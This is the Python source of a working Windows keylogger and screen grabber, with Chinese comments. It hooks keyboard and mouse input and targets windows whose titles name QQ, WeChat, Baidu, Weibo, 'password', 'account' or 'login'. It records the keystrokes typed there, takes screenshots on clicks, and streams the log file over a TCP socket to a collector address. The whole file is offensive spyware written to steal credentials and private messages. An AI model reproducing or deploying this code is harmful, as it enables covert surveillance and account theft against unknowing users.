import pythoncom 
import PyHook3
import os
import time
import socket
from PIL import ImageGrab

lists=['百度','QQ','哔哩哔哩','微博','微信','密码','password','账号','account','login','kali linux','bilibili']
MSG=""
save_to=1
title_word=""
global_title=""
ADDR=('127.0.0.1', 6666)
runstatus=1
PSIZE=1024
set_encoding='utf-8'
clientSockfd=""
open_filename='D:/QQdata/data/Monitor.txt'
dos_filename='D:\\QQdata\\data\\Monitor.txt'
dos_pic_dir='D:\\QQdata\\data\\xx11\\'


def server_connect():
    tcpSock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcpSock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

def iter_count(file_name):
    from itertools import takewhile, repeat
    f = open(file_name,'r')
    buf_gen = takewhile(lambda x: x, (f.read(1024**2) for _ in repeat(None)))
    return sum(buf.count('\n') for buf in buf_gen)

def write_msg_to_txt(msg):
    global open_filename
    global dos_filename
    global dos_pic_dir
    if os.path.exists(dos_filename)==False:
        os.system('mkdir %s >nul' %dos_pic_dir)
        os.system('type nul > %s' %dos_filename)
        quit()
    cl=iter_count(open_filename)+1
    if cl >=200:
        os.system('type nul > %s' %dos_filename)

    f=open(open_filename,'a')
    f.write(msg+'\x0A')
    f.close()
    sendfile(open_filename)

def get_local_time(press):
    if press=='keyboard':
        return time.strftime('%Y-%m-%d_%H:%M: ', time.localtime(time.time()))
    else:
        return time.strftime('%Y-%m-%d_%Hh%Mm%Ss', time.localtime(time.time()))

def get_local_image(dirpath):
    pic_lists =os.listdir(dirpath)
    print(len(pic_lists))
    if len(pic_lists) >100:
        for pl in pic_lists:
            fpath=dirpath+pl
            if os.path.isfile(fpath):
                os.remove(fpath)

    pic=ImageGrab.grab()
    pic_name='D:/QQdata/data/xx11/mouse_%s.jpg' %get_local_time("")
    pic.save('%s' %pic_name)
    return pic_name

def onMouseEvent(event):
    global lists
    global MSG
    global global_title
    global dos_pic_dir

    mouse_status=event.MessageName
    pic_msg=""
    if mouse_status=="mouse left down" or mouse_status=="mouse right down":
        if global_title in lists:
            if MSG!="":
                write_msg_to_txt(MSG)
                pic_msg=get_local_image(dos_pic_dir)
                write_msg_to_txt(pic_msg)
            global_title=""
    # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
    return True

def onKeyboardEvent(event):
    #--------------判断用户目前在操作的界面开头是否包含关键词算法---------------
    global lists
    global MSG
    global title_word
    global global_title

    keyid=event.Ascii
    keychar=chr(event.Ascii)
    keyword=event.Key
    title=event.WindowName

    words=''
    status=1
    title_status=1
    break_status=1

    if len(title) >0:
        for n in range(len(lists)):
            if len(title) >=len(lists[n]):
                for tw in title:
                    words+=tw
                    if words ==lists[n]:
                        global_title=words
                        title_status=0
                        break_status=0
                        break
            if break_status==0:
                break
            words=''

    if title_status==0:
        if (title_word!=title and keyword!="Lcontrol" and keyword!="Rcontrol"
            and keyword!="Lmenu" and keyword!="Rmenu" and keyword!="Capital"
            and keyword!="Lshift" and keyword!="Rshift"
            ):
            title_word=title
            MSG=get_local_time('keyboard')+title+"窗口: "
        if 127 > keyid >32:
            MSG+=keychar
        else:
            if keyword=="Return":
                MSG+="<回车>"
                status=0
            elif keyword=="Tab":
                MSG+="<水平制表>"
            elif keyword=="Back":
                MSG+="<退格>"
            elif keyword=="Delete":
                MSG+="<删除>"
            elif keyword=="Space":
                MSG+="<空格>"
    if status == 0:
        if MSG!="":
            write_msg_to_txt(MSG)
        title_word=""
        global_title=""
        kwords=""
    #-----------------------------------------------------------------------
    # 同鼠标事件监听函数的返回值
    return True
def sendfile(filename):
    global PSIZE
    global clientSockfd
    global set_encoding

    f=open(filename,'rb')
    while True:
        msg=f.read(PSIZE)
        if not msg:
            break
        clientSockfd.sendall(msg)
    f.close()
    clientSockfd.sendall(bytes('EOF', encoding=set_encoding))
    print('send file success')

def main():
    global ADDR
    global runstatus
    global clientSockfd

    while True:
        ltime=time.strftime('%S',time.localtime(time.time()))
        if int(ltime)%6==0:
            try:
                clientSockfd=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                clientSockfd.connect(ADDR)
                print("已建立连接....",ADDR)
                runstatus=0
                break
            except socket.error:
                print('无法正常连接:{}，错误信息:'.format(str(ADDR)),socket.error)
        else:
            time.sleep(1)
    if runstatus==0:
        # 创建一个“钩子”管理对象
        hm = PyHook3.HookManager()
        # 监听所有鼠标事件钩子
        hm.MouseAll = onMouseEvent
        hm.HookMouse()
        # 监听所有键盘事件钩子
        hm.KeyDown = onKeyboardEvent
        hm.HookKeyboard()
        # 进入循环，如不手动关闭，程序将一直处于监听状态
        pythoncom.PumpMessages()
if __name__ == "__main__":
    main()

